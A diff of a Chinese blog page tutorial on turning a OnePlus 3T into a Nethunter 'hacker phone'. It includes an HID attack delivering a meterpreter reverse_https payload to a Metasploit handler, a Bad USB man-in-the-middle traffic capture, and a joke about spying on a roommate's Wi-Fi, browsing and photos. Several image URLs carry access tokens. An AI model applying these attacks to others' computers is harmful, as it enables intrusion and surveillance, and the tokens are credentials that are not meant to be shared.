@@ -4,7 +4,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>30分钟打造一台&#34;黑客&#34;手机--Nethunter | Mari0er&#39;s blog</title>
 <meta name="description" content="" />
-<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565663219373">
+<link rel="shortcut icon" href="https://mari0er.github.io/favicon.ico?v=1565666348121">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 <link rel="stylesheet" href="https://mari0er.github.io/styles/main.css">
@@ -20,7 +20,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://mari0er.github.io">
-  <img class="avatar" src="https://mari0er.github.io/images/avatar.png?v=1565663219373" alt="">
+  <img class="avatar" src="https://mari0er.github.io/images/avatar.png?v=1565666348121" alt="">
   </a>
   <h1 class="site-title">
     Mari0er&#39;s blog
@@ -100,11 +100,11 @@
 </ul>
 <h2 id="一-root手机并刷入第三方recovery">一. Root手机并刷入第三方Recovery</h2>
 <p>打开一加3T工具箱，连接手机，根据提示选择12，工具箱会自动帮你刷入TWRP并root设备<br>
-<img src="https://www.mari0er.club/uploads/0101.png" alt="工具包"></p>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/0101.png?token=AEK3VGYSQXPUAEHSOKO7KEK5KIQXG" alt="工具包"></p>
 <h2 id="二-刷入系统底包">二. 刷入系统底包</h2>
 <p>关机后，同时按住电源键和音量下键进入TWRP模式，用数据线连接手机，根据个人选择将氢、氧或者CM底包放入手机TWRP目录，刷入底包和对应的root包(刷入前记得4清)。<br>
 **注意:**开机后,进入设置--&gt;关于手机--&gt;连续点击7下版本号打开开发者模式，进入开发者模式打开USB调试和OEM锁。<br>
-<img src="https://www.mari0er.club/uploads/0102.png" alt="pic"></p>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/0102.png?token=AEK3VG6QBRCPD7MD3JDR2MC5KIQ3U" alt="pic"></p>
 <h2 id="三-刷入nethunter包和nethunter内核">三. 刷入Nethunter包和Nethunter内核</h2>
 <p>关机，进入TWRP模式，复制文件到手机TWRP目录，点击install添加Nethuter包和内核包，注意顺序。刷入后开机，就可以看见炫酷的开机画面。进入手机界面后，点击Nethunter图标，给予root权限。</p>
 <h2 id="四-简单的使用文档说明">四. 简单的使用文档说明</h2>
@@ -139,7 +139,7 @@
 　　首先，打开Kali Services中的Apache服务，之后转到HID Attacks，设置PowerSploit参数，IP和端口填写MSF监听的IP端口。Payload选择windows/meterpreter/reverse_https,URL为提供Apache服务的IP,这里即是本机:192.168.10.2，写完后，UPDATE。<br>
 ###02<br>
 　　之后进入kali终端，利用msf生成payload，此时将设备连接至PC机,等待设备被识别后,执行Execute,开始攻击.POWERSHELL命令执行后,就可在msf中看到反弹的shell了</p>
-<pre><code class="language-linux">root@kali:~# msfconsole
+<pre><code>root@kali:~# msfconsole
 msf &gt; use exploit/multi/handler
 msf exploit(handler) &gt;
 .
@@ -150,15 +150,15 @@ msf exploit(handler) &gt; set LPORT 4444
 LPORT =&gt; 4444
 msf exploit(handler) &gt; exploit
 </code></pre>
-<p><img src="https://www.mari0er.club/uploads/0104.png" alt="PS"></p>
+<p><img src="https://raw.githubusercontent.com/mari0er/picture/master/0104.png?token=AEK3VG2BN3QXVKIKML4RY2K5KIQ5C" alt="ＰＳ"></p>
 <hr>
 <p><strong>9.DuckHunter HID</strong><br>
 　　模拟大黄鸭，将USB Rubber Ducky脚本转换为NetHunter HID攻击格式，具体用法和上面类似</p>
 <p><strong>10.Bad USB MITM Attack</strong><br>
 　　通过USB线接入受害者电脑，执行此攻击可以劫持受害者流量,kali终端会多出一个rndis0的虚拟网卡<br>
-<img src="https://www.mari0er.club/uploads/0105.png" alt="pic5"></p>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/0105.png?token=AEK3VG32W762WP5WV3RWLUS5KIQ5W" alt="pic5"></p>
 <p>此时可以开启Tcpdimp截取流量：Tcpdump –i rndis0<br>
-<img src="https://www.mari0er.club/uploads/0106.png" alt="pic"></p>
+<img src="https://raw.githubusercontent.com/mari0er/picture/master/0106.png?token=AEK3VG2TK3MHZ2PVK3PKIES5KIQ6C" alt="PIC6"></p>
 <p><strong>11.Mana Wireless Toolkit</strong><br>
 　　蜜罐，需要配合无线网卡使用</p>
 <p><strong>12.MITM Framework</strong><br>
@@ -183,6 +183,9 @@ msf exploit(handler) &gt; exploit
 <p>** 5.详细的使用方法?**<br>
 　　其实NT就是手机版的Kali，kali里面能使用的工具，NT基本都能使用！如果将Nethunter做为渗透机器，需要为其配置大的供电设备，还需要为其配置无线网卡，有点鸡肋。不过娱乐娱乐，破解WIFI，中间人嗅探，断下室友wifi，看看室友的浏览记录和图片还是可以的,不说了室友又要来打我了，哈哈！！</p>
 <p><strong>注:本文提到的所有工具只是为了安全研究，切勿非法使用！使用上述工具产生的一切法律问题及后果，本站概不负责！</strong></p>
+<p>function sayHello() {<br>
+console.log(&quot;Hello Wolrd&quot;);<br>
+}</p>
 
               </div>
               <div class="toc-container">
